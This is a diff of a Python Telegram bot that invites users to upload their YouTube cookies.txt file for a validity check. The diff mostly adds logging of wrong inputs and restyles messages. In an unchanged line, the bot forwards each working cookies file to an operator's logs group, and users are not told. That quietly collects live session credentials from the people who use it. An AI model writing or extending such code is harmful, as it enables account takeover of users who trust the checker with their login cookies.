@@ -26,9 +26,24 @@ TIME = "⏰"
 @app.on_message(filters.command("chkcookies") & filters.private)
 async def enable_cookie_check(client, message):
     active_users.add(message.chat.id)
-    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `tcookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")
+    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")
 
-# Step 2: Accept Only If `/chkcookies` was Used
+# Step 2: Handle Wrong Inputs (Images, Videos, Text)
+@app.on_message(filters.private & ~filters.document)
+async def warn_wrong_input(client, message):
+    if message.chat.id in active_users:
+        await message.reply(f"{CROSS} ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` file.\n\n✅ sᴛᴇᴘs:\n1️⃣ ᴏᴘᴇɴ ғɪʟᴇ ᴍᴀɴᴀɢᴇʀ 📂\n2️⃣ ғɪɴᴅ `cookies.txt`\n3️⃣ sᴇɴᴅ ɪᴛ ʜᴇʀᴇ ✅")
+        
+        # Log incorrect input to logs group
+        log_msg = f"""
+{SHIELD} ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ !
+{BULLET} {USER} ᴜsᴇʀ: {message.from_user.first_name}
+{BULLET} {TIME} Time: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
+{BULLET} {CROSS} ᴇʀʀᴏʀ: sᴇɴᴛ ᴡʀᴏɴɢ ғɪʟᴇ ᴛʏᴘᴇ ᴏʀ ᴍᴇssᴀɢᴇ ɪɴsᴛᴇᴀᴅ ᴏғ `cookies.txt`!
+"""
+        await client.send_message(LOGS_GROUP_ID, log_msg)
+
+# Step 3: Accept Only If `/chkcookies` was Used
 @app.on_message(filters.document & filters.private)
 async def check_cookies_from_file(client, message: Message):
     if message.chat.id not in active_users:
@@ -37,10 +52,19 @@ async def check_cookies_from_file(client, message: Message):
     file_path = await message.download()
 
     if not file_path.endswith(".txt"):
-        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!")
+        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!\n✅ Make sure the file is named `cookies.txt`.")
+        
+        # Log invalid file
+        log_msg = f"""
+{SHIELD} ɪɴᴠᴀʟɪᴅ ғɪʟᴇ sᴇɴᴛ !
+{BULLET} {USER} ᴜsᴇʀ: {message.from_user.first_name}
+{BULLET} {TIME} ᴛɪᴍᴇ: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
+{BULLET} {CROSS} ᴇʀʀᴏʀ: sᴇɴᴛ `{file_path.split('/')[-1]}` ɪɴsᴛᴇᴀᴅ ᴏғ `cookies.txt`!
+"""
+        await client.send_message(LOGS_GROUP_ID, log_msg)
         return
 
-    # Step 3: Read Cookies File
+    # Step 4: Read Cookies File
     try:
         with open(file_path, "r") as f:
             cookies_data = f.read().strip()
@@ -50,13 +74,13 @@ async def check_cookies_from_file(client, message: Message):
             os.remove(file_path)  # Delete temp file
             return
 
-        # Step 4: Get User Info & Time
+        # Step 5: Get User Info & Time
         user_name = message.from_user.username
         full_name = message.from_user.first_name
         display_name = f"@{user_name}" if user_name else full_name
         check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM
 
-        # Step 5: Validate YouTube Cookies
+        # Step 6: Validate YouTube Cookies
         ydl_opts = {"quiet": True, "cookiefile": file_path}
 
         try:
@@ -67,7 +91,7 @@ async def check_cookies_from_file(client, message: Message):
             log_msg = f"""
 {SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
 {BULLET} {CHECK} ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ {CHECK}
-{BULLET} {USER} User: {display_name}
+{BULLET} {USER} ᴜsᴇʀ: {display_name}
 {BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ : {check_time}
 """
 
@@ -75,7 +99,7 @@ async def check_cookies_from_file(client, message: Message):
             await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
 
         except yt_dlp.utils.ExtractorError:
-            msg = f"{CROSS} Your YouTube cookies are invalid or expired !"
+            msg = f"{CROSS} Your ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ !"
             log_msg = f"""
 {SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
 {BULLET} {CROSS} ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ {CROSS}
@@ -87,10 +111,10 @@ async def check_cookies_from_file(client, message: Message):
         await message.reply(msg, quote=True)
 
     except Exception as e:
-        await message.reply(f"⚠️ Error reading file: `{str(e)}`")
+        await message.reply(f"⚠️ ᴇʀʀᴏʀ ʀᴇᴀᴅɪɴɢ ғɪʟᴇ: `{str(e)}`")
 
-    # Step 6: Clean Up Temporary File
+    # Step 7: Clean Up Temporary File
     os.remove(file_path)
 
-    # Step 7: Remove User from Active List
+    # Step 8: Remove User from Active List
     active_users.remove(message.chat.id)
